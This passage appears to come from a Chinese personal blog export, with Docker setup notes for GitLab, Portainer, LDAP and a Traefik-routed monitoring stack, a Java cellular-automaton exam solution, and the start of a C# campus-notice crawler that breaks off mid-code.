<h2 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h2><h3 id="Gitlab"><a href="#Gitlab" class="headerlink" title="Gitlab"></a>Gitlab</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d  -p 8001:8001 -p 222:22 --name gitlab   \</span><br><span class="line">    -v <span class="string">&quot;<span class="subst">$(pwd)</span>/gitlab/config&quot;</span>:/etc/gitlab \</span><br><span class="line">    -v <span class="string">&quot;<span class="subst">$(pwd)</span>/gitlab/logs&quot;</span>:/var/log/gitlab \</span><br><span class="line">    -v <span class="string">&quot;<span class="subst">$(pwd)</span>/gitlab/data&quot;</span>:/var/opt/gitlab \</span><br><span class="line">    --restart=always gitlab/gitlab-ce</span><br></pre></td></tr></table></figure>

<h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><h3 id="Portainer-docs"><a href="#Portainer-docs" class="headerlink" title="Portainer [docs]"></a>Portainer [<a href="https://documentation.portainer.io/v2.0/deploy/ceinstalldocker">docs</a>]</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -p 9000:9000 -p 8000:8008 --name portainer \</span><br><span class="line">-v /var/run/docker.sock:/var/run/docker.sock \</span><br><span class="line">-v &quot;$(pwd)/portainer&quot;/data:/data \</span><br><span class="line">-d portainer/portainer-ce \</span><br><span class="line">--tunnel-port 8008 # 默认8000</span><br></pre></td></tr></table></figure>

<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="hoppscotch-postwoman"><a href="#hoppscotch-postwoman" class="headerlink" title="hoppscotch(postwoman)"></a>hoppscotch(postwoman)</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">docker run -p <span class="number">3000</span><span class="punctuation">:</span><span class="number">3000</span> hoppscotch/hoppscotch<span class="punctuation">:</span>latest</span><br></pre></td></tr></table></figure>

<h2 id="Chat"><a href="#Chat" class="headerlink" title="Chat"></a>Chat</h2><h3 id="Rocket-chat"><a href="#Rocket-chat" class="headerlink" title="Rocket.chat"></a>Rocket.chat</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -L https://raw.githubusercontent.com/RocketChat/Docker.Official.Image/master/compose.yml -O</span><br></pre></td></tr></table></figure>

<h1 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h1><h2 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h2><h3 id="ldap"><a href="#ldap" class="headerlink" title="ldap"></a>ldap</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -p 389:389 \</span><br><span class="line">    -v <span class="variable">$PWD</span>/ldap/ldap:/var/lib/ldap \</span><br><span class="line">    -v <span class="variable">$PWD</span>/ldap/slapd.d:/etc/ldap/slapd.d \</span><br><span class="line">    --name ldap \</span><br><span class="line">    --<span class="built_in">env</span> LDAP_TLS=<span class="literal">false</span> \</span><br><span class="line">    --<span class="built_in">env</span> LDAP_ORGANISATION=<span class="string">&quot;zhaoqi&quot;</span> \</span><br><span class="line">    --<span class="built_in">env</span> LDAP_DOMAIN=<span class="string">&quot;zhaoqi.vip&quot;</span> \</span><br><span class="line">    --<span class="built_in">env</span> LDAP_ADMIN_PASSWORD=<span class="string">&quot;123456&quot;</span> \</span><br><span class="line">    --<span class="built_in">env</span> LDAP_CONFIG_PASSWORD=<span class="string">&quot;123456&quot;</span> \</span><br><span class="line">    --restart=always osixia/openldap</span><br></pre></td></tr></table></figure>

<h3 id="phpldapadmin"><a href="#phpldapadmin" class="headerlink" title="phpldapadmin"></a>phpldapadmin</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -dit -p 19999:80 \</span><br><span class="line">    --<span class="built_in">link</span> ldap \</span><br><span class="line">    --name ldap_mgr \</span><br><span class="line">    --<span class="built_in">env</span> PHPLDAPADMIN_HTTPS=<span class="literal">false</span> \</span><br><span class="line">    --<span class="built_in">env</span> PHPLDAPADMIN_LDAP_HOSTS=ldap \</span><br><span class="line">    --restart=always osixia/phpldapadmin</span><br></pre></td></tr></table></figure>

<h1 id="搭配Traefik"><a href="#搭配Traefik" class="headerlink" title="搭配Traefik"></a>搭配Traefik</h1><h2 id="Traefik"><a href="#Traefik" class="headerlink" title="Traefik"></a>Traefik</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">reverse-proxy:</span></span><br><span class="line">    <span class="comment"># The official v2 Traefik docker image</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">traefik</span></span><br><span class="line">    <span class="comment"># Enables the web UI and tells Traefik to listen to docker</span></span><br><span class="line">    <span class="attr">command:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;--api.insecure=true&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;--entrypoints.http.address=:80&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;--entrypoints.https.address=:443&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;--providers.docker=true&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;--providers.docker.watch=true&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;--providers.file=true&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;--providers.file.watch=true&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;--providers.file.directory=/etc/traefik/config&quot;</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="comment"># The HTTP port</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;80:80&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;443:443&quot;</span></span><br><span class="line">      <span class="comment"># The Web UI (enabled by --api.insecure=true)</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;8080:8080&quot;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="comment"># So that Traefik can listen to the Docker events</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;/var/run/docker.sock:/var/run/docker.sock&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./traefik/ssl/:/ssl/:ro</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./traefik/config:/etc/traefik/config</span></span><br><span class="line">    <span class="attr">labels:</span></span><br><span class="line">      <span class="comment"># Frontend</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.enable=true&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.routers.traefik.rule=Host(`traefik.cloud.tencent.com`)&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.services.traefik.loadbalancer.server.port=8080&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="Route"><a href="#Route" class="headerlink" title="Route"></a>Route</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">portainer:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">portainer/portainer-ce:2.9.3</span></span><br><span class="line">    <span class="comment">#command: -H unix:///var/run/docker.sock</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/var/run/docker.sock:/var/run/docker.sock</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./portainer:/data</span></span><br><span class="line">    <span class="attr">labels:</span></span><br><span class="line">      <span class="comment"># Frontend</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.enable=true&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.routers.frontend.rule=Host(`portainer.cloud.tencent.com`)&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.services.frontend.loadbalancer.server.port=9000&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.routers.frontend.service=frontend&quot;</span></span><br><span class="line"></span><br><span class="line">      <span class="comment"># Edge</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.routers.edge.rule=Host(`portainer.cloud.tencent.com`)&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.services.edge.loadbalancer.server.port=8000&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.routers.edge.service=edge&quot;</span></span><br><span class="line">  <span class="attr">cadvisor:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">google/cadvisor:latest</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">cadvisor</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/:/rootfs:ro</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/var/run:/var/run:rw</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/sys:/sys:ro</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/var/lib/docker/:/var/lib/docker:ro</span></span><br><span class="line">    <span class="attr">labels:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.enable=true&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.routers.cadvisor.rule=Host(`cadvisor.cloud.tencent.com`)&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.services.cadvisor.loadbalancer.server.port=8080&quot;</span></span><br><span class="line">  <span class="attr">prometheus:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">prom/prometheus</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./prometheus:/etc/prometheus</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./prometheus/data:/prometheus</span></span><br><span class="line">    <span class="attr">command:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;--storage.tsdb.retention.time=30d&#x27;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;--config.file=/etc/prometheus/prometheus.yml&#x27;</span></span><br><span class="line">    <span class="attr">labels:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.enable=true&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.routers.prometheus.rule=Host(`prometheus.cloud.tencent.com`)&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.services.prometheus.loadbalancer.server.port=9090&quot;</span></span><br><span class="line">    <span class="attr">extra_hosts:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;prometheus.cloud.tencent.com:172.17.0.1&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;cadvisor.cloud.tencent.com:172.17.0.1&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;node-exporter.cloud.tencent.com:172.17.0.1&quot;</span></span><br><span class="line">  <span class="attr">influxdb:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">influxdb</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./influxdb:/var/lib/influxdb</span></span><br><span class="line">    <span class="attr">labels:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.enable=true&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.routers.influxdb.rule=Host(`influxdb.cloud.tencent.com`)&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.services.influxdb.loadbalancer.server.port=8086&quot;</span></span><br><span class="line">    <span class="attr">extra_hosts:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;prometheus.cloud.tencent.com:172.17.0.1&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;influxdb.cloud.tencent.com:172.17.0.1&quot;</span></span><br><span class="line">  <span class="attr">grafana:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">grafana/grafana</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./grafana:/var/lib/grafana</span></span><br><span class="line">    <span class="attr">labels:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.enable=true&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.routers.grafana.rule=Host(`grafana.cloud.tencent.com`)&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.services.grafana.loadbalancer.server.port=3000&quot;</span></span><br><span class="line">    <span class="attr">extra_hosts:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;prometheus.cloud.tencent.com:172.17.0.1&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;influxdb.cloud.tencent.com:172.17.0.1&quot;</span></span><br><span class="line">  <span class="attr">node-exporter:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">prom/node-exporter</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">node-exporter</span></span><br><span class="line">    <span class="attr">command:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;--path.rootfs=/host&#x27;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;/:/host:ro,rslave&#x27;</span></span><br><span class="line">    <span class="attr">pid:</span> <span class="string">host</span></span><br><span class="line">    <span class="attr">labels:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.enable=true&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.routers.node-exporter.rule=Host(`node-exporter.cloud.tencent.com`)&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;traefik.http.services.node-exporter.loadbalancer.server.port=9100&quot;</span></span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <tags>
        <tag>Docker</tag>
        <tag>容器</tag>
      </tags>
  </entry>
  <entry>
    <title>期末考试_细胞自动机</title>
    <url>/posts/6200/</url>
    <content><![CDATA[<h2 id="题目内容："><a href="#题目内容：" class="headerlink" title="题目内容："></a>题目内容：</h2><p>这是细胞自动机的非图形版本。细胞自动机是指在一个二维网格内，每一个网格是一个细胞。每个细胞有活和死两种状态。<br>初始时刻，有些细胞是活的，有些细胞是死的。自动机的每一步，根据每个细胞周围8个格子内的其他细胞的生存情况决定这个细胞下一步是否存活。具体的规则如下：</p>
<ul>
<li>如果该细胞现在是活的，并且周围8个格子中有2或3个活着的细胞，则继续存活；如果周围8个格子中的活着的细胞数量少于2个或多于3个，则死亡；</li>
<li>如果该细胞现在是死的，并且周围8个格子中正好有3个活着的细胞，则细胞复活。</li>
<li>位于整个网格边缘和顶角的细胞，它的周围细胞可能少于8个。即越过网格的边界不再有细胞。</li>
<li>每个细胞的生死变化，都不会影响当前这一步周围的细胞，只会在下一步表现出来。</li>
</ul>
<p>提示：课程中的代码与上一句描述不同。</p>
<span id="more"></span>
<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式:"></a>输入格式:</h2><p>首先输入两个正整数，范围为[3,102]，依次表示网格的宽度和高度。<br>然后输入多组正整数，依次表示一个活着的细胞的网格位置，每组数字中，第一个表示行号，第二个表示列号，均从0开始编号。<br>最后，以“-1 -1”表示不再有活着的细胞。-1 -1不是有效的位置。<br>然后，以一个正整数，范围为[1,10000]，表示要求细胞自动机执行的步数。</p>
<h2 id="输出格式："><a href="#输出格式：" class="headerlink" title="输出格式："></a>输出格式：</h2><p>输出一个正整数，表示执行完毕后，剩下的活着的细胞的数量。</p>
<h2 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h2><div class="note default no-icon"><p>3 3
1 1 1 2 0 1 2 1
-1 -1
1
</p></div>
## 输出样例：
<div class="note default no-icon"><p>7
</p></div>

<p><strong>时间限制：500ms内存限制：32000kb</strong></p>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> 面向对象程序设计_Java语言_翁恺;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">The_final_exam</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">int</span> times;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">int</span> width;</span><br><span class="line">	<span class="keyword">private</span> <span class="type">int</span> height;</span><br><span class="line">	<span class="type">int</span> old_field[][];</span><br><span class="line">	<span class="type">int</span> new_field[][];</span><br><span class="line"></span><br><span class="line">	<span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">Init</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		width = in.nextInt();</span><br><span class="line">		height = in.nextInt();</span><br><span class="line">		old_field = <span class="keyword">new</span> <span class="title class_">int</span>[height+<span class="number">2</span>][width+<span class="number">2</span>];</span><br><span class="line">		new_field = <span class="keyword">new</span> <span class="title class_">int</span>[height+<span class="number">2</span>][width+<span class="number">2</span>];</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 初始化为0</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; height+<span class="number">2</span>; i++)</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; width+<span class="number">2</span>; j++)</span><br><span class="line">			&#123;</span><br><span class="line">				old_field[i][j] = <span class="number">0</span>;</span><br><span class="line">				old_field[i][j] = <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//读入活的细胞的位置</span></span><br><span class="line">		<span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="type">int</span> i=in.nextInt();</span><br><span class="line">			<span class="type">int</span> j=in.nextInt();</span><br><span class="line">			<span class="keyword">if</span>(i==-<span class="number">1</span>&amp;&amp;j==-<span class="number">1</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			old_field[i+<span class="number">1</span>][j+<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">			new_field[i+<span class="number">1</span>][j+<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//读入执行步数</span></span><br><span class="line">		times = in.nextInt();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>;k&lt;times;k++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;height+<span class="number">1</span>;i++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;width+<span class="number">1</span>;j++)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="type">int</span> count=getNeighbor(i, j);</span><br><span class="line">					<span class="keyword">if</span>(old_field[i][j]==<span class="number">0</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">if</span>(count==<span class="number">3</span>)<span class="comment">//细胞复活</span></span><br><span class="line">							new_field[i][j]=<span class="number">1</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">if</span>(!(count==<span class="number">2</span>||count==<span class="number">3</span>))<span class="comment">//细胞死亡</span></span><br><span class="line">							new_field[i][j]=<span class="number">0</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">//copy</span></span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; height+<span class="number">1</span>; i++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; width+<span class="number">1</span>; j++)</span><br><span class="line">				&#123;</span><br><span class="line">					old_field[i][j] = new_field[i][j];</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> <span class="title function_">getNeighbor</span><span class="params">(<span class="type">int</span> i,<span class="type">int</span> j)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//计算位置为i，j的细胞周围活的细胞的数量</span></span><br><span class="line">		<span class="type">int</span> temp=<span class="number">0</span>;</span><br><span class="line">		temp+=old_field[i-<span class="number">1</span>][j]+old_field[i+<span class="number">1</span>][j]+old_field[i][j-<span class="number">1</span>]+old_field[i][j+<span class="number">1</span>];</span><br><span class="line">		temp+=old_field[i-<span class="number">1</span>][j-<span class="number">1</span>]+old_field[i-<span class="number">1</span>][j+<span class="number">1</span>]+old_field[i+<span class="number">1</span>][j-<span class="number">1</span>]+old_field[i+<span class="number">1</span>][j+<span class="number">1</span>];</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> <span class="title function_">Count</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//计算活着的细胞的数量</span></span><br><span class="line">		<span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; height+<span class="number">1</span>; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; width+<span class="number">1</span>; j++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>(old_field[i][j]==<span class="number">1</span>)</span><br><span class="line">					count++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> count;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">Test</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		Init();</span><br><span class="line">		run();</span><br><span class="line">		System.out.println(Count());</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="keyword">new</span> <span class="title class_">The_final_exam</span>().Test();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><p>简单模拟题....<br>用两个二维数组来存细胞，细胞自动机每执行一次，遍历数组1一次，对数组1中每个细胞的状态进行判断，计算周围活着的细胞的数量，然后对数组2进行相应的操作，所有操作完成后将数组2拷贝至数组1。<br>这里判断细胞周围活着的细胞数量时有一个小技巧，不需要对每种边界情况进行处理,可以将数组开大点，下标从1开始使用，相当于在所使用的有效数组空间外面绕了一圈，避免数组越界。</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>面向对象程序设计_Java语言_翁恺</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>用C#爬虫爬取校园最新通知</title>
    <url>/posts/976598171/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几个月用Python写了一个爬虫，用于爬取校园最新通知。最近的C#课程设计中想实现同样的功能，于是按照之前Python代码的思路重构了一下。<br><a href="https://zhaoqi99.github.io/45013.html">用Python实现校园通知更新提醒</a></p>
<span id="more"></span>

<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>使用C#中的HttpWebRequest库去获取目标url(各个网站的’更多通知’页)的源代码，然后使用<code> System.Text.RegularExpressions;</code>进行正则匹配。<br>正则表达式应包含三个分组:日期、标题、链接；</p>
<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul>
<li>命名空间导入<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="keyword">using</span> System.Text.RegularExpressions;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p>Spider基类:</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Spider</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">string</span> url = <span class="built_in">string</span>.Empty;<span class="comment">//要爬取的网页的url</span></span><br><span class="line">    <span class="keyword">public</span> HttpWebRequest request;</span><br><span class="line">    <span class="keyword">public</span> HttpWebResponse response;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> encode = <span class="string">&quot;UTF-8&quot;</span>;<span class="comment">//目标url的网页编码格式</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> Method = <span class="built_in">string</span>.Empty;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> Url</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">get</span> &#123; <span class="keyword">return</span> url; &#125;</span><br><span class="line">        <span class="keyword">set</span></span><br><span class="line">        &#123;</span><br><span class="line">            url = <span class="keyword">value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> Encode</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">get</span> &#123; <span class="keyword">return</span> encode; &#125;</span><br><span class="line">        <span class="keyword">set</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">value</span> == <span class="string">&quot;UTF-8&quot;</span> || <span class="keyword">value</span> == <span class="string">&quot;GBK&quot;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                encode = <span class="keyword">value</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//Todo:handle exception</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Spider</span>(<span class="params"><span class="built_in">string</span> url,<span class="built_in">string</span> method</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.url = url;</span><br><span class="line">        <span class="keyword">this</span>.Method = method;</span><br><span class="line">        Create();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Spider</span>()</span> &#123; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Create</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        request = (HttpWebRequest)WebRequest.Create(url);</span><br><span class="line">        request.Method = Method;</span><br><span class="line">        request.Credentials = CredentialCache.DefaultCredentials;</span><br><span class="line">        request.UserAgent = <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//获取目标url的Html代码</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="built_in">string</span> <span class="title">getHtml</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">string</span> reader = <span class="built_in">string</span>.Empty;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            Create();</span><br><span class="line">            response = (HttpWebResponse)request.GetResponse();</span><br><span class="line">            <span class="keyword">if</span> (response.StatusCode == HttpStatusCode.OK)</span><br><span class="line">            &#123;</span><br><span class="line">                StreamReader sr = <span class="keyword">new</span> StreamReader(response.GetResponseStream(), Encoding.GetEncoding(encode));</span><br><span class="line">                reader = sr.ReadToEnd();</span><br><span class="line">                sr.Close();</span><br><span class="line">                response.Close();<span class="comment">//关闭response响应流</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> Exception();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e)</span><br><span class="line">        &#123;</span><br><span 